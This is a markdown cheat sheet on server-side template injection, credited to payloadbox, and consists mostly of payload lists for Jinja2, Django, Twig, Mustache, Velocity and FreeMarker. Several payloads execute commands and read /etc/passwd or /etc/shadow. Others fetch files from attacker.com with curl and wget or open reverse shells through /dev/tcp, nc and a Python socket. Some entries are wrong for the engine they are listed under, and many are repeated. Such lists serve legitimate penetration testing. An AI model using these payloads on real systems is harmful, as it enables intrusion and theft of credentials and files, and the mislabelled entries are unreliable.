# Server-Side Template Injection (SSTI)

## Description
Server-Side Template Injection (SSTI) is a type of security vulnerability that occurs when user input is insecurely embedded in server-side templates, allowing an attacker to execute arbitrary code on the server. This can lead to data exposure, remote code execution, and other malicious activities.

## Conditions to be Vulnerable
For a web application to be vulnerable to SSTI, the following conditions typically need to be met:
1. **Use of a Template Engine**: The application must utilize a server-side template engine (e.g., Jinja2, Twig, Django templates).
2. **Insecure Handling of User Input**: User input is directly or indirectly passed to the template engine without proper sanitization or validation.
3. **Dynamic Template Rendering**: The application allows dynamic rendering of templates based on user input.

## Where to Test
You can test for SSTI vulnerabilities in web applications that:
- Accept user input to dynamically generate content (e.g., search forms, profile pages).
- Use popular template engines, such as:
  - Jinja2 (Python)
  - Twig (PHP)
  - Django Templates (Python)
  - Mustache (JavaScript)

| Template Engine  | Payload                                      | Description                              |
|------------------|---------------------------------------------|------------------------------------------|
| **Jinja2**       | `{{ config }}`                             | Access the application configuration.    |
|                  | `{{ request }}`                            | Access the request object.               |
|                  | `{{ self }}`                               | Access the current object context.       |
|                  | `{{ 7*7 }}`                                | Evaluate mathematical expressions.       |
|                  | `{{ 'hello'.__class__.__mro__ }}`       | Get the method resolution order.         |
| **Django**       | `{{ self.__class__.mro() }}`              | Retrieve method resolution order.        |
|                  | `{{ request.GET }}`                        | Access GET parameters.                   |
|                  | `{{ request.POST }}`                       | Access POST parameters.                  |
|                  | `{{ ''|slice:'::1' }}`                     | Perform slicing operations.              |
| **Twig**         | `{{ dump(app) }}`                          | Dump the application context.            |
|                  | `{{ foo.bar() }}`                          | Call a method on an object.              |
|                  | `{{ config('app.debug') }}`               | Access application configuration.        |
| **Mustache**     | `{{#foo}}{{.}}{{/foo}}`                    | Iterate over `foo` and display items.   |
|                  | `{{#user}}{{name}}{{/user}}`              | Access user name from the user object.  |
| **Mako**         | `${config}`                                | Access the application configuration.    |
|                  | `${request}`                               | Access the request object.               |
|                  | `${self}`                                  | Access the current object context.       |
| **Handlebars**   | `{{#if (eq this "value")}}True{{else}}False{{/if}}` | Conditional expression evaluation.       |
|                  | `{{#each items}}<li>{{this}}</li>{{/each}}` | Iterate over items array.               |


|Name | Credit |
|-------|-----------|
|    payloadbox    |     https://github.com/payloadbox/ssti-payloads |             


## Common Payload
 ```bash 
{{2*2}}[[3*3]]
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen
{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"/etc/passwd\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```


# 100 Common SSTI Payloads

### Jinja2 (Python-based web apps):
- `{{ 7 * 7 }}`
- `{{ config.items() }}`
- `{{ ''.__class__.__mro__[1].__subclasses__() }}`
- `{{ ''.__class__.__mro__[1].__subclasses__()[59] }}`
- `{{ ''.__class__.__mro__[1].__subclasses__()[59]().__init__.__globals__['__builtins__']['eval']('system("id")') }}`
- `{{ ''.__class__.__mro__[1].__subclasses__()[59]().exec('import os; os.system("id")') }}`
- `{{ request.__class__.__mro__[1].__subclasses__() }}`
- `{{ config.get('key') }}`
- `{{ 'a'.__class__.__mro__[1].__subclasses__() }}`
- `{{ loop.__class__.__mro__[1].__subclasses__() }}`
- `{{ os.system('id') }}`
- `{{ salt.__class__.__mro__[1].__subclasses__() }}`
- `{{ a.__class__.__mro__[1].__subclasses__()[59]() }}`
- `{{ "secret" | file_contents }}`
- `{{ ''.__class__.__mro__[1].__subclasses__()[54]().__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}`
- `{{ 'a'.__class__.__mro__[1].__subclasses__()[35]().open('/etc/passwd') }}`
- `{{ self.__class__.__mro__[1].__subclasses__()[59]().exec("import os; os.system('ls')") }}`
- `{{ "test" | system('ls') }}`
- `{{ config.items().__getitem__(1) }}`
- `{{ config.get('path') }}`
- `{{ self.__class__.__mro__[1].__subclasses__()[22] }}`
- `{{ self.__class__.__mro__[1].__subclasses__()[100] }}`
- `{{ request.__class__.__mro__[1].__subclasses__()[15] }}`
- `{{ ''.__class__.__mro__[1].__subclasses__()[40]().exec('cat /etc/passwd') }}`
- `{{ loop.__class__.__mro__[1].__subclasses__()[10] }}`
- `{{ self.__class__.__mro__[1].__subclasses__()[200] }}`
- `{{ ''.__class__.__mro__[1].__subclasses__()[23]().exec('ls -la') }}`
- `{{ 'a'.__class__.__mro__[1].__subclasses__()[50]() }}`
- `{{ os.popen('ls').read() }}`
- `{{ request.GET.get('key') }}`
- `{{ request.FILES.get('file') }}`
- `{{ request.POST['key'] }}`
- `{{ request.session }}`
- `{{ settings.SECRET_KEY }}`
- `{{ settings.DATABASES }}`
- `{{ config.__class__.__mro__[1].__subclasses__() }}`
- `{{ ''.__class__.__mro__[1].__subclasses__()[10] }}`
- `{{ settings.INSTALLED_APPS }}`
- `{{ settings.MIDDLEWARE }}`
- `{{ settings.DEBUG }}`
- `{{ loop.__class__.__mro__[1].__subclasses__()[50]() }}`
- `{{ request.COOKIES }}`
- `{{ request.META }}`
- `{{ settings.LANGUAGE_CODE }}`
- `{{ settings.TIME_ZONE }}`
- `{{ settings.LOGIN_URL }}`
- `{{ settings.LOGIN_REDIRECT_URL }}`
- `{{ request.user }}`
- `{{ request.method }}`
- `{{ request.GET }}`
- `{{ request.POST }}`
- `{{ request.session }}`
- `{{ settings.TEMPLATES }}`
- `{{ settings.ALLOWED_HOSTS }}`
- `{{ config.get('path') }}`
- `{{ settings.BASE_DIR }}`
- `{{ settings.CACHES }}`
- `{{ settings.ROOT_URLCONF }}`
- `{{ config.__class__.__mro__[1].__subclasses__()[100] }}`
- `{{ settings.AUTH_PASSWORD_VALIDATORS }}`
- `{{ settings.SECRET_KEY }}`
- `{{ settings.DEBUG_PROPAGATE_EXCEPTIONS }}`
- `{{ settings.CSRF_COOKIE_NAME }}`
- `{{ settings.CSRF_COOKIE_HTTPONLY }}`
- `{{ settings.CSRF_COOKIE_SECURE }}`
- `{{ settings.CSRF_FAILURE_VIEW }}`
- `{{ settings.CSRF_HEADER_NAME }}`
- `{{ settings.CSRF_USE_SESSIONS }}`
- `{{ settings.CSRF_TRUSTED_ORIGINS }}`
- `{{ settings.MANAGERS }}`
- `{{ settings.TIME_ZONE }}`
- `{{ settings.USE_L10N }}`
- `{{ settings.LOCALE_PATHS }}`
- `{{ settings.MAIL_SERVER }}`
- `{{ settings.EMAIL_HOST }}`
- `{{ settings.EMAIL_HOST_USER }}`
- `{{ settings.EMAIL_HOST_PASSWORD }}`
- `{{ settings.EMAIL_PORT }}`
- `{{ settings.EMAIL_USE_TLS }}`
- `{{ settings.EMAIL_BACKEND }}`
- `{{ settings.EMAIL_FILE_PATH }}`
- `{{ settings.EMAIL_SUBJECT_PREFIX }}`
- `{{ settings.EMAIL_TIMEOUT }}`
- `{{ settings.EMAIL_USE_SSL }}`
- `{{ settings.DEFAULT_FROM_EMAIL }}`
- `{{ settings.EMAIL_REPLY_TO }}`
- `{{ settings.ADMINS }}`
- `{{ settings.MAIL_DEFAULT_SENDER }}`
- `{{ settings.DEFAULT_EMAIL_SENDER }}`
- `{{ settings.DEFAULT_FROM_EMAIL }}`
- `{{ settings.ADMINS }}`
- `{{ settings.DEFAULT_FROM_EMAIL }}`
  
### Django Template Payloads:
- `{{ 7 * 7 }}`
- `{{ 'a'.__class__.__mro__[1].__subclasses__()[59] }}`
- `{{ self.__class__.__mro__[1].__subclasses__() }}`
- `{{ object.__class__.__mro__[1].__subclasses__()[58] }}`
- `{{ 7 * 7 }}`
- `{{ 'a'.__class__.__mro__[1].__subclasses__()[35] }}`
- `{{ view.__class__.__mro__[1].__subclasses__() }}`
- `{{ self.__class__.__mro__[1].__subclasses__()[45] }}`
- `{{ request.__class__.__mro__[1].__subclasses__() }}`
- `{{ settings.__class__.__mro__[1].__subclasses__() }}`
- `{{ settings.SECRET_KEY }}`
- `{{ config.__class__.__mro__[1].__subclasses__() }}`
- `{{ 'os'.__class__.__mro__[1].__subclasses__()[22] }}`
- `{{ 'os'.__class__.__mro__[1].__subclasses__()[70] }}`
- `{{ request.COOKIES }}`
- `{{ request.FILES }}`
- `{{ loop.__class__.__mro__[1].__subclasses__() }}`
- `{{ ''.__class__.__mro__[1].__subclasses__() }}`
- `{{ object.__class__.__mro__[1].__subclasses__()[58]() }}`
- `{{ settings.DATABASES }}`
- `{{ settings.DEBUG }}`
- `{{ settings.MIDDLEWARE }}`
- `{{ settings.TEMPLATES }}`
- `{{ 'os'.__class__.__mro__[1].__subclasses__()[59]() }}`
- `{{ 'a'.__class__.__mro__[1].__subclasses__()[22]() }}`
- `{{ 'a'.__class__.__mro__[1].__subclasses__()[90]() }}`
- `{{ settings.LANGUAGE_CODE }}`
- `{{ settings.TIME_ZONE }}`
- `{{ settings.LOGIN_URL }}`
- `{{ settings.LOGIN_REDIRECT_URL }}`
- `{{ request.META }}`
- `{{ 'os'.__class__.__mro__[1].__subclasses__()[45] }}`
- `{{ settings.BASE_DIR }}`
- `{{ settings.ALLOWED_HOSTS }}`
- `{{ request.user }}`
- `{{ request.method }}`
- `{{ request.GET }}`
- `{{ request.POST }}`
- `{{ request.session }}`
- `{{ settings.INSTALLED_APPS }}`
- `{{ settings.AUTH_PASSWORD_VALIDATORS }}`
- `{{ settings.SECRET_KEY }}`
- `{{ settings.BASE_URL }}`
  
### Twig Payloads (for PHP apps):
- `{{ 7 * 7 }}`
- `{{ dump() }}`
- `{{ 'a'.__class__.__mro__[1].__subclasses__() }}`
- `{{ system('id') }}`
- `{{ exec('ls') }}`
- `{{ shell_exec('id') }}`
- `{{ phpinfo() }}`
- `{{ fopen('/etc/passwd') }}`
- `{{ "phpinfo" | system }}`
- `{{ "id" | system }}`
- `{{ "ls -la" | system }}`
- `{{ "cat /etc/passwd" | system }}`
- `{{ "cat /flag.txt" | system }}`
- `{{ "echo secret" | system }}`
- `{{ "ls /" | system }}`
- `{{ "dir" | system }}`
- `{{ "uname -a" | system }}`
- `{{ "id" | shell_exec }}`
- `{{ "cat /etc/passwd" | shell_exec }}`
- `{{ "cat /etc/shadow" | shell_exec }}`
- `{{ "ls /home" | shell_exec }}`
- `{{ "echo Hello World" | shell_exec }}`
- `{{ "whoami" | shell_exec }}`
- `{{ "ls -al /tmp" | shell_exec }}`
- `{{ "cat /var/log/apache2/error.log" | shell_exec }}`
- `{{ "cat /var/log/syslog" | shell_exec }}`
- `{{ "cat /root/secret.txt" | shell_exec }}`
- `{{ "curl http://attacker.com/malicious" | shell_exec }}`
- `{{ "wget http://attacker.com/malicious" | shell_exec }}`
- `{{ "echo 'malicious command' > /tmp/shell.sh" | shell_exec }}`
- `{{ "sh /tmp/shell.sh" | shell_exec }}`
- `{{ "chmod +x /tmp/shell.sh" | shell_exec }}`
- `{{ "rm -rf /tmp/shell.sh" | shell_exec }}`
- `{{ "touch /tmp/exploited" | shell_exec }}`
- `{{ "echo Exploit successful" | system }}`
- `{{ "sh -i >& /dev/tcp/attacker.com/1337 0>&1" | system }}`
- `{{ "nc -e /bin/sh attacker.com 1337" | system }}`
  
### Mustache Payloads:
- `{{#system}}id{{/system}}`
- `{{!system}}id{{/system}}`
- `${'id'.execute()}`
- `#{'id'.execute()}`
- `${{system('ls')}}`
- `#{ system("ls") }`
- `#{ "cat /etc/passwd" | execute }`
- `#{ "echo exploit" | execute }`
- `#set($foo = "id")#foreach($item in $foo)${item}#end`

### Velocity Payloads:
- `#set($foo = "id")#foreach($item in $foo)${item}#end`
- `#set($result = $tools.execute("id"))`
- `#set($result = $tools.system("ls"))`
- `#set($result = $tools.shellExec("cat /etc/passwd"))`

### FreeMarker Payloads:
- `${"id"}` 
- `${"ls -la"}` 
- `${"cat /etc/passwd"}` 
- `${"echo Exploit"}` 
- `#{execute("id")}`


